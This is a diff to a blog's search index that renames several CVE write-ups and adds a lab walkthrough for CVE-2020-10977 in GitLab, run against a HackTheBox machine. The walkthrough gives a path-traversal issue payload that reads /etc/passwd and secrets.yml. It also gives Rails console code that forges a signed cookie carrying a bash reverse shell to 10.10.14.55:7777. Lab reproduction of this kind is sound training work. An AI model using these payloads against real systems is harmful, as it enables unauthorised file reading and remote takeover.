@@ -132,7 +132,7 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-0796漏洞复现</title>
+    <title>CVE-2020-0796_SMB-Ghost漏洞复现</title>
     <url>/2020/07/02/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796" target="_blank" rel="noopener">CVE-2020-0796</a>是SMBv3.1.1压缩机制中的一个bug，也称为”SMBGhost”。这个错误是整数溢出错误，它发生在srv2.sys SMB服务器驱动程序的Srv2DecompressData函数中。Srv2DecompressData函数接收客户机发送的压缩消息，分配所需的内存，并解压数据。然后，如果偏移量字段不为零，它将放在压缩数据之前的数据复制到已分配缓冲区的开始位置。如果攻击者精心构造了一段消息发送给SMB，有可能将会导致溢出执行任意命令。</p>
 <p>影响版本</p>
@@ -243,7 +243,7 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-1472漏洞复现</title>
+    <title>CVE-2020-1472Windows-ZeroLogon漏洞复现</title>
     <url>/2020/10/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
 <p>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。</p>
@@ -10567,7 +10567,7 @@ column_name  列名</code></pre><p>确认表中有多少字段（order by）</p>
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-9496反序列化漏洞复现</title>
+    <title>CVE-2020-9496_OFBiz反序列化漏洞复现</title>
     <url>/2021/01/26/CVE-2020-9496%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>影响范围</p>
 <ul>
@@ -11069,6 +11069,68 @@ column_name  列名</code></pre><p>确认表中有多少字段（order by）</p>
       <tags>
         <tag>Linux</tag>
         <tag>jackson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2020-10977_GitLab任意文件读取导致RCE漏洞复现</title>
+    <url>/2021/03/09/CVE-2020-10977%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install policycoreutils openssh-server openssh-clients postfix</span><br></pre></td></tr></table></figure>
+<p>分配给虚拟机的物理内存最好是4G。</p>
+<p>下载gitlab安装包</p>
+<ul>
+<li><p>CE下载地址：<a href="https://packages.gitlab.com/gitlab/gitlab-ce" target="_blank" rel="noopener">https://packages.gitlab.com/gitlab/gitlab-ce</a></p>
+</li>
+<li><p>EE下载地址：<a href="https://packages.gitlab.com/gitlab/gitlab-ee" target="_blank" rel="noopener">https://packages.gitlab.com/gitlab/gitlab-ee</a></p>
+</li>
+</ul>
+<p>安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install .&#x2F;gitlab......12_8.1.rpm</span><br></pre></td></tr></table></figure>
+
+<p>修改监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb</span><br><span class="line"></span><br><span class="line">external_url &#39;http:&#x2F;&#x2F;localhost:8888&#39;</span><br></pre></td></tr></table></figure>
+
+<p>重置和重启</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gitlab-ctl reconfigure</span><br><span class="line"></span><br><span class="line">gitlab-ctl restart</span><br></pre></td></tr></table></figure>
+
+<p>第一次进入会提示重置root密码</p>
+<h2 id="0x02-任意文件读取漏洞复现"><a href="#0x02-任意文件读取漏洞复现" class="headerlink" title="0x02 任意文件读取漏洞复现"></a>0x02 任意文件读取漏洞复现</h2><p>创建两个项目（test1 和 test2</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:24:52-_By9fIt_O36viF.png" alt="20210309-08:24:52-_By9fIt_O36viF"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:26:10-_T98qwn_mogzsu.png" alt="20210309-08:26:10-_T98qwn_mogzsu"></p>
+<p>在test1中新建一个issue。</p>
+<p>内容为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd)</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:27:10-_HGh3yK_MV8ygY.png" alt="20210309-08:27:10-_HGh3yK_MV8ygY"></p>
+<p>创建好后，将这个issue移动到test2。</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:27:38-_Be3jaU_f9Ff6H.png" alt="20210309-08:27:38-_Be3jaU_f9Ff6H"></p>
+<p>如果漏洞存在，并且文件有可读权限，就会变成一个链接。因为/etc/passwd被复制到了 <code>/var/opt/gitlab/gitlab-rails/uploads/@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/ed7e8cddbc49e3746e0b9974b5393d79/passwd</code><br><img src="https://images.atsud0.me/images/post/20210309-08:28:08-_lHi6lY_aM20WQ.png" alt="20210309-08:28:08-_lHi6lY_aM20WQ"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:47:53-_ZpR5vy_FDXJZL.png" alt="20210309-08:47:53-_ZpR5vy_FDXJZL"></p>
+<h2 id="0x03-RCE漏洞复现"><a href="#0x03-RCE漏洞复现" class="headerlink" title="0x03 RCE漏洞复现"></a>0x03 RCE漏洞复现</h2><p>根据报告<a href="https://hackerone.com/reports/827052" target="_blank" rel="noopener">Hackone-Arbitrary file read via the UploadsRewriter when moving and issue</a>内容，需要修改cookie，并且读取目标机器上的secret.yaml，并在本地搭建一个gitlab，将本地的gitlab环境的secret.yaml替换为目标机器上的secret.yaml，然后用gitlab的工具来生成cookie，最后携带这段cookie直接请求目标gitlab环境即可。</p>
+<p>这里我受害机环境使用的是HackTheBox靶机<a href="https://www.hackthebox.eu/home/machines/profile/298" target="_blank" rel="noopener">Laboratory</a></p>
+<p>步骤1 利用LFI漏洞先读取secrets.yaml，来获取secret_key_base字段。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210309-08:54:20-_VKsHlY_bljjkV.png" alt="20210309-08:54:20-_VKsHlY_bljjkV"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:56:00-_JQy17p_AgTtwS.png" alt="20210309-08:56:00-_JQy17p_AgTtwS"></p>
+<p>需要将本地的gitlab的secrets.yaml的secret_key_base字段替换为受害机的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/20210309-09:06:32-_ZQ8xH0_8WVpIV.png" alt="20210309-09:06:32-_ZQ8xH0_8WVpIV"></p>
+<p>替换好之后，进入到radis console</p>
+<p>依次输入以下内容，在获取到cookie之前，这些命令会在本机执行一次，所以在拿到cookie之后再监听端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request &#x3D; ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[&quot;action_dispatch.cookies_serializer&quot;] &#x3D; :marshal</span><br><span class="line">cookies &#x3D; request.cookie_jar</span><br><span class="line">erb &#x3D; ERB.new(&quot;&lt;%&#x3D; &#96;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.55&#x2F;7777 0&gt;&amp;1&#39;&#96; %&gt;&quot;)</span><br><span class="line">depr &#x3D; ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@result&quot;, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] &#x3D; depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://images.atsud0.me/images/post/20210309-09:19:19-_83wzq5_JvfiZX.png" alt="20210309-09:19:19-_83wzq5_JvfiZX"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-09:19:48-_F09ZMj_JR4sM5.png" alt="20210309-09:19:48-_F09ZMj_JR4sM5"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://hackerone.com/reports/827052" target="_blank" rel="noopener">Hackone-Arbitrary file read via the UploadsRewriter when moving and issue</a></li>
+<li><a href="https://juejin.cn/post/6916343939649765389" target="_blank" rel="noopener">CVE-2020-10977-Gitlab CE/EE 任意文件读取导致远程命令执行漏洞</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶机实验</category>
+      </categories>
+      <tags>
+        <tag>GitLab</tag>
       </tags>
   </entry>
 </search>
